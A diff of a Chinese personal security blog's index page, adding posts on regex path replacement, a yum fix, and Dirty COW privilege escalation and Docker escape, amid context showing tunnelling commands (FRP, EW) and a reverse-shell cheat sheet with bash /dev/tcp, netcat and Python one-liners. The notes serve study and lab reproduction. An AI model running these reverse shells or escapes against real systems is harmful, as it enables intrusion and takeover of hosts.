@@ -151,6 +151,318 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-正则表达式" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">正则表达式中的选择替换问题</a>
+    </h1>
+  
+
+        
+        <a href="/2021/01/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="archive-article-date">
+  	<time datetime="2021-01-04T06:29:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在VScode中用来批量替换路径</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\路径\2020-12-10-信道隐藏\image-20201229115659517.png</span><br></pre></td></tr></table></figure>
+
+<p><strong>路径替换为</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;machine-blog.oss-cn-beijing.aliyuncs.com&#x2F;Blog&#x2F;2020-12-10-信道隐藏&#x2F;image-20201229115659517.png</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>由于不仅仅要替换掉单个文件里面的内容还有涉及到整个项目的文件路径替换,所以用到了VScode的全局替换。</p>
+<p>首先我们将</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\路径\</span><br></pre></td></tr></table></figure>
+
+<p>替换为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;machine-blog.oss-cn-beijing.aliyuncs.com&#x2F;Blog&#x2F;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>这个简单，正常替换即可</p>
+<p>较难的的是后面中的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020-12-10-信道隐藏\</span><br></pre></td></tr></table></figure>
+
+<p><kbd>\</kbd>前面的内容是文件夹名称，每个都不一样，但后面的<kbd>\</kbd>要被替换为<kbd>/</kbd></p>
+<p>这里想到了VScode搜索替换支持正则表达式，我们从这里入手</p>
+<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>在正则表达式中，<kbd>$1</kbd>代表在正则表达式中第一个括号括起来的字段中匹配到的部分</p>
+<p>因此我们可以构建</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\\路径\\(.*)\\      #这里使用双反斜杠，用来转译“\”</span><br></pre></td></tr></table></figure>
+
+<p>替换为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;machine-blog.oss-cn-beijing.aliyuncs.com&#x2F;Blog&#x2F;$1&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>即可</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">正则表达式</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/01/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-解决Packagekit占用yum问题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/30/%E8%A7%A3%E5%86%B3Packagekit%E5%8D%A0%E7%94%A8yum%E9%97%AE%E9%A2%98/">解决Packagekit占用yum问题</a>
+    </h1>
+  
+
+        
+        <a href="/2020/12/30/%E8%A7%A3%E5%86%B3Packagekit%E5%8D%A0%E7%94%A8yum%E9%97%AE%E9%A2%98/" class="archive-article-date">
+  	<time datetime="2020-12-30T07:26:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>编辑</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;yum&#x2F;pluginconf.d&#x2F;langpacks.conf</span><br></pre></td></tr></table></figure>
+
+<p>将里面的“1”改为“0”</p>
+<p>再次尝试，会发现依然占用，kill掉即可</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">CentOS</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">YUM</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/12/30/%E8%A7%A3%E5%86%B3Packagekit%E5%8D%A0%E7%94%A8yum%E9%97%AE%E9%A2%98/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-提权" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/30/%E6%8F%90%E6%9D%83/">提权</a>
+    </h1>
+  
+
+        
+        <a href="/2020/12/30/%E6%8F%90%E6%9D%83/" class="archive-article-date">
+  	<time datetime="2020-12-30T02:40:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="脏牛"><a href="#脏牛" class="headerlink" title="脏牛"></a>脏牛</h2><h3 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h3><p>大于2.6.22版本 (2007年发行，到2016年10月18日修复)</p>
+<h3 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h3><p>低权限的用户可利用这一漏洞在本地进行提权</p>
+<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>linux内核的子系统在处理写入时复制至产生了竞争条件，恶意用户可利用此漏洞来获取高权限，对只读内存映射进行访问。</p>
+<p>竞争条件，指的是任务执行顺序异常，可导致应用奔溃，或令攻击者有机可乘，进一步执行其他代码，利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获取到root权限。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<p>这里利用I春秋平台进行复现</p>
+<p>gcc编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirtyc0w.c -o dirtyc0w</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-30-%E6%8F%90%E6%9D%83/image-20201230105057992.png" alt="image-20201230105057992"></p>
+<p>选项中指定<code>-pthread</code> 会附加一个宏定义 <code>-D_REENTRANT</code>该宏会导致 <code>libc</code> 头文件选择那些<code>thread-safe</code>的实现。<code>-o</code>参数为编译后输出文件名。</p>
+<p>向文件写入自定义字符</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-30-%E6%8F%90%E6%9D%83/image-20201230105458571.png" alt="image-20201230105458571"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-30-%E6%8F%90%E6%9D%83/image-20201230105640814.png" alt="image-20201230105640814"></p>
+<p>设置权限、<code>0404</code>代表所有用户默认情况下对该文件只有读取权限，无法修改删除。</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-30-%E6%8F%90%E6%9D%83/image-20201230105524307.png" alt="image-20201230105524307"></p>
+<p>使用POC进行强制写入（123456为写入的字符）</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-30-%E6%8F%90%E6%9D%83/image-20201230110409428.png" alt="image-20201230110409428"></p>
+<p>写入完成</p>
+<h2 id="利用脏牛（dirty-COW-实现docker逃逸）"><a href="#利用脏牛（dirty-COW-实现docker逃逸）" class="headerlink" title="利用脏牛（dirty COW 实现docker逃逸）"></a>利用脏牛（dirty COW 实现docker逃逸）</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在Linux中，有一个功能：<strong>VDSO(virtual dvnamic shared object)</strong>,这是一个小型共享库，能将内核自动映射到所有用户程序的地址空间。</p>
+<p>什么是VDSO呢？</p>
+<p><strong>VDSO</strong></p>
+<p>它是一个优化性能的功能。</p>
+<p>我们举个例子：<code>gettimeofday</code>是一个获取当前时间的函数，它经常被用户的程序调用，如果一个程序需要知道当前的时间，程序就会频繁的轮询。为了减少资源开销，内核需要把它放在一个所有进程都能访问的内存位置，然后通过VDSO定义一个功能来共享这个对象，让进程来访问此信息。</p>
+<p>通过这种方式，调用的时间和资源花销就大大的降低了，速度也就变得更快。</p>
+<p>那么如何利用VDSO来实现Docker逃逸的？</p>
+<p>首先POC利用Dirty Cow漏洞，将Payload写到VDSO中的一些闲置内存中，并改变函数的执行顺序，使得在执行正常函数之前调用这个Shellcode。</p>
+<p>Shellcode初始化时会检测是否被root所调用，如果调用，则继续执行，如果没有调用则返回，并执行<code>clock_gettime</code>函数，接下来它会检测/tmp/.X文件的存在，如果存在，则这时已经是root权限了，然后它会打开一个反向的TCP链接，为Shellcode中填写的ip返回一个Shell。</p>
+<p>漏洞就这样产生了。</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>查看物理机内的docker镜像(docker需要使用root权限)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-30-%E6%8F%90%E6%9D%83/image-20201230111449030.png" alt="image-20201230111449030"></p>
+<p>启动docker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name&#x3D;test -p 1234:1234 -itd dirtycow &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>进入镜像</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it test &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>运行POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;dirtycow-vdso&#x2F;    &#x2F;&#x2F;进入dirtycow-vdso文件夹</span><br><span class="line">make       &#x2F;&#x2F;使用make命令编译.c文件</span><br><span class="line">.&#x2F;0xdeadbeef     &#x2F;&#x2F;运行0xdeadbeef 文件</span><br></pre></td></tr></table></figure>
+
+<p>当看到successfully的字样，就代表我们成功了</p>
+<p>测试</p>
+<p>我们现在置身Docker中，现在宿主机的桌面创建一个文件，如果可以创建，则表明逃逸成功。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home      &#x2F;&#x2F;进入到home文件夹</span><br><span class="line">ls        &#x2F;&#x2F;查看都有何文件</span><br><span class="line">touch nice      &#x2F;&#x2F; 创建文件nice</span><br></pre></td></tr></table></figure>
+
+<p>现在退出Docker，看一看是否真的在宿主机的桌面创建了nice文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exit       &#x2F;&#x2F;退出POC</span><br><span class="line">exit       &#x2F;&#x2F;退出Docker</span><br><span class="line">cd &#x2F;home      &#x2F;&#x2F;进入home目录</span><br><span class="line">ls -l       &#x2F;&#x2F;查看当前文件所属</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/12/30/%E6%8F%90%E6%9D%83/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-HTML标签集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -350,16 +662,16 @@
 <h1 id="端口复用"><a href="#端口复用" class="headerlink" title="端口复用"></a>端口复用</h1><h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
 <p>frp 主要由客户端(frpc)和服务端(frps)组成，服务端部署在具有公⽹ IP 的机器上，客户端部署在需要穿<br>透的内⽹服务所在的机器上</p>
 <p>服务端配置文件</p>
-<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229115659517.png" alt="image-20201229115659517"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-10-%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/image-20201229115659517.png" alt="image-20201229115659517"></p>
 <p>客户端配置文件</p>
-<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229115723915.png" alt="image-20201229115723915"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-10-%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/image-20201229115723915.png" alt="image-20201229115723915"></p>
 <blockquote>
 <p> local_port本地要映射出去的端口</p>
 <p> remote_port  要映射成的公网端口</p>
 </blockquote>
 <p>连接</p>
-<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229115952583.png" alt="image-20201229115952583"></p>
-<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229120010011.png" alt="image-20201229120010011"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-10-%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/image-20201229115952583.png" alt="image-20201229115952583"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-10-%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/image-20201229120010011.png" alt="image-20201229120010011"></p>
 <h2 id="LCX"><a href="#LCX" class="headerlink" title="LCX"></a>LCX</h2><h2 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
 <p>VPS：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 10800 -e 18888</span><br></pre></td></tr></table></figure>
@@ -368,11 +680,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_win.exe -s rssocks -p vpsip -e 18888</span><br></pre></td></tr></table></figure>
 
 <p>网络配置代理</p>
-<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229131121395.png" alt="image-20201229131121395"></p>
-<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229131134890.png" alt="image-20201229131134890"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-10-%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/image-20201229131121395.png" alt="image-20201229131121395"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-10-%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/image-20201229131134890.png" alt="image-20201229131134890"></p>
 <h2 id="端口复用（TcpTunnel）"><a href="#端口复用（TcpTunnel）" class="headerlink" title="端口复用（TcpTunnel）"></a>端口复用（TcpTunnel）</h2><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/YDHCUI/TcpTunnel">https://github.com/YDHCUI/TcpTunnel</a></p>
-<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229132259934.png" alt="image-20201229132259934"></p>
-<p><img src="/2020/12/10/%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/file\code\Blog\source_posts\2020-12-10-信道隐藏\image-20201229132458792.png" alt="image-20201229132458792"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-10-%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/image-20201229132259934.png" alt="image-20201229132259934"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-12-10-%E4%BF%A1%E9%81%93%E9%9A%90%E8%97%8F/image-20201229132458792.png" alt="image-20201229132458792"></p>
 
       
 
@@ -478,11 +790,11 @@
 <h4 id="将输入重定向到文件‘test-input’"><a href="#将输入重定向到文件‘test-input’" class="headerlink" title="将输入重定向到文件‘test_input’"></a>将输入重定向到文件‘test_input’</h4><p>新建一个文件‘test_input’,内容是：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 123</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217163827724.png" alt="image-20201217163827724"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201217163827724.png" alt="image-20201217163827724"></p>
 <p>使用输入重定向</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">bash&lt;test_input </span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217163947161.png" alt="image-20201217163947161"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201217163947161.png" alt="image-20201217163947161"></p>
 <h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a><strong>输出重定向</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式： [n]&gt; word    （注意[n]与&gt;之间没有空格）</span><br></pre></td></tr></table></figure>
 
 <p>将输出重定向到文件‘test_out’</p>
@@ -492,11 +804,11 @@
 <p>查看文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim test_out</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217172050051.png" alt="image-20201217172050051"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201217172050051.png" alt="image-20201217172050051"></p>
 <h3 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a><strong>标准输出与标准错误输出重定向</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式： &amp;&gt; word &gt;&amp; word</span><br></pre></td></tr></table></figure>
 
 <h4 id="错误输出重定向测试"><a href="#错误输出重定向测试" class="headerlink" title="错误输出重定向测试"></a>错误输出重定向测试</h4><p>以输入不存在的命名来测试</p>
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217172816252.png" alt="image-20201217172816252"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201217172816252.png" alt="image-20201217172816252"></p>
 <blockquote>
 <p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，**&amp;是为了区分文件1和文件描述符1的**)</p>
 </blockquote>
@@ -558,21 +870,21 @@
 </blockquote>
 <h1 id="应用篇"><a href="#应用篇" class="headerlink" title="应用篇"></a>应用篇</h1><h2 id="命令确定⽬标⽀持的反弹⽅式"><a href="#命令确定⽬标⽀持的反弹⽅式" class="headerlink" title="命令确定⽬标⽀持的反弹⽅式"></a>命令确定⽬标⽀持的反弹⽅式</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis nc bash python ruby php exec lua perl java  //可依据需要添加其他语言</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228112501467.png" alt="image-20201228112501467"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201228112501467.png" alt="image-20201228112501467"></p>
 <h2 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.92.***.***/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228145300805.png" alt="image-20201228145300805"></p>
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228145428668.png" alt="image-20201228145428668"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201228145300805.png" alt="image-20201228145300805"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201228145428668.png" alt="image-20201228145428668"></p>
 <h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc ip port -e /bin/sh</span><br><span class="line">nc.traditional ip port -e /bin/sh</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc ip port &gt;/tmp/f    ##没有e参数，结合管道命令进⾏反弹</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150131526.png" alt="image-20201228150131526"></p>
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150113360.png" alt="image-20201228150113360"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201228150131526.png" alt="image-20201228150131526"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201228150113360.png" alt="image-20201228150113360"></p>
 <h2 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import</span><br><span class="line">socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.conne</span><br><span class="line">ct((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150737869.png" alt="image-20201228150737869"></p>
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150753311.png" alt="image-20201228150753311"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201228150737869.png" alt="image-20201228150737869"></p>
